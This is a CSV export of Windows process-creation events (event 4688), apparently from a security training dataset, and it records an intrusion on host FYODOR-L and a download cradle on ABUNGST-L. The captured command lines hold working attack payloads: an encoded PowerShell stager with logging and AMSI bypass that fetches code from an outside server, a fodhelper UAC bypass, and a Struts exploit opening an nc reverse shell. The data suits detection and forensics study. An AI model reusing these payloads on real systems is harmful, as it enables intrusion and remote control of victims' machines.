"_time",host,EventCode,Message
"2018-08-20T14:28:40.000+0100","MKRAEUS-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		MKRAEUS-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf7c
	New Process Name:	C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1f38
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe
	Process Command Line:	""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe"" install ""Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" /NoDependencies /noroot /version:v4.0.30319 /LegacyServiceBehavior

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T14:28:37.000+0100","MKRAEUS-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		MKRAEUS-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x130
	New Process Name:	C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1f38
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe
	Process Command Line:	""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe"" install ""Microsoft.PowerShell.Security, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" /NoDependencies /noroot /version:v4.0.30319 /LegacyServiceBehavior

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:57:15.000+0100","ABUNGST-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\AlBungstein
	Account Name:		AlBungstein
	Account Domain:		AzureAD
	Logon ID:		0x1A28E3

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xb7c
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x1aa0
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:57:15.000+0100","ABUNGST-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\AlBungstein
	Account Name:		AlBungstein
	Account Domain:		AzureAD
	Logon ID:		0x1A28E3

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1aa0
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0xe8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:52:16.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		FYODOR-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1bf4
	New Process Name:	C:\Windows\System32\tar.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1548
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\tar.exe"" -cvzf archive.tar *

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:34:00.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xedc
	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x226c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:33:45.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xb84
	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x226c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""mknod /tmp/backpipe p""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:32:13.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x226c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1c74
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -W Hidden -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBlAHIAUwBpAE8ATgAuAE0AQQBKAG8AcgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcARQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEAbABVAEUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBMAD0AWwBDAG8ATABMAGUAYwBUAGkAbwBuAFMALgBHAEUAbgBFAHIASQBjAC4ARABpAEMAdABpAG8AbgBBAHIAeQBbAFMAVABSAGkATgBnACwAUwB5AFMAVABlAG0ALgBPAEIASgBFAGMAdABdAF0AOgA6AG4ARQBXACgAKQA7ACQAVgBBAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEATAB9AEUAbABzAEUAewBbAFMAQwByAEkAUABUAEIAbABvAGMAawBdAC4AIgBHAEUAVABGAEkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBBAGwAdQBlACgAJABuAHUAbABsACwAKABOAGUAdwAtAE8AQgBKAEUAYwBUACAAQwBvAEwAbABlAGMAdABpAE8AbgBTAC4ARwBlAE4ARQBSAGkAQwAuAEgAQQBTAGgAUwBlAFQAWwBTAFQAcgBJAG4AZwBdACkAKQB9ACQAUgBlAGYAPQBbAFIARQBmAF0ALgBBAFMAcwBlAE0AYgBsAFkALgBHAGUAdABUAFkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAVQBlACgAJABuAFUAbABMACwAJAB0AHIAVQBlACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AUwBFAHIAdgBJAEMARQBQAG8AaQBuAFQATQBhAG4AYQBnAGUAcgBdADoAOgBFAFgAcABlAGMAdAAxADAAMABDAG8AbgBUAGkAbgBVAEUAPQAwADsAJABXAGMAPQBOAEUAdwAtAE8AYgBKAGUAYwBUACAAUwBZAFMAdABFAG0ALgBOAEUAVAAuAFcAZQBCAEMATABJAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAHcAYwAuAEgAZQBhAEQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAEgAZQBhAEQARQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBvAHgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAGUAdAAuAFcARQBCAFIARQBxAFUARQBTAFQAXQA6ADoARABlAEYAYQBVAGwAdABXAGUAQgBQAHIAbwB4AHkAOwAkAFcAYwAuAFAAUgBPAFgAWQAuAEMAcgBFAEQARQBuAFQASQBhAGwAcwAgAD0AIABbAFMAeQBzAHQARQBNAC4ATgBlAHQALgBDAHIAZQBEAGUATgB0AGkAYQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAHUATAB0AE4AZQB0AFcATwByAEsAQwBSAEUARABlAG4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABFAE0ALgBUAEUAeABUAC4ARQBOAEMAbwBEAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQBUAEUAcwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBOAGMAbwBkAEkAbgBnAF0AOgA6AFUATgBpAGMATwBkAGUALgBHAGUAdABTAHQAUgBpAG4ARwAoAFsAQwBPAE4AdgBFAHIAVABdADoAOgBGAHIATwBtAEIAQQBTAGUANgA0AFMAdABSAEkAbgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAUAB0AGgAQQBWAGcAcwA9AHYAdgA2AHIAVwBSADQAMABwAFkAUgBLAHkAeAA4AGEAMABIADMAbwBwADcAMgBvAGQAVgBVAD0AIgApADsAJABkAEEAdABBAD0AJABXAGMALgBEAG8AVwBuAEwAbwBBAGQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABEAGEAdABhAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABEAEEAVABhAFsANAAuAC4AJABEAGEAVABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBvAEkAbgBbAEMAaABBAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:32:12.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1dcc
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1c74
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:32:12.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1c74
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x288c
	Creator Process Name:	C:\Windows\System32\fodhelper.exe
	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:32:12.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		FYODOR-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Process Information:
	New Process ID:		0x288c
	New Process Name:	C:\Windows\System32\fodhelper.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x15d4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\fodhelper.exe"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:32:12.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091CB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1944
	New Process Name:	C:\Windows\System32\fodhelper.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x15d4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\fodhelper.exe"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:32:11.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091CB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xfc0
	New Process Name:	C:\Windows\System32\whoami.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x15d4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\whoami.exe"" /groups

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:32:10.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091CB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2b98
	New Process Name:	C:\Windows\System32\whoami.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x15d4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\whoami.exe"" /groups

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:28:40.000+0100","BSTOLL-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\BudStoll
	Account Name:		BudStoll
	Account Domain:		AzureAD
	Logon ID:		0x4B339

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1fac
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2078
	Creator Process Name:	C:\Windows\System32\browser_broker.exe
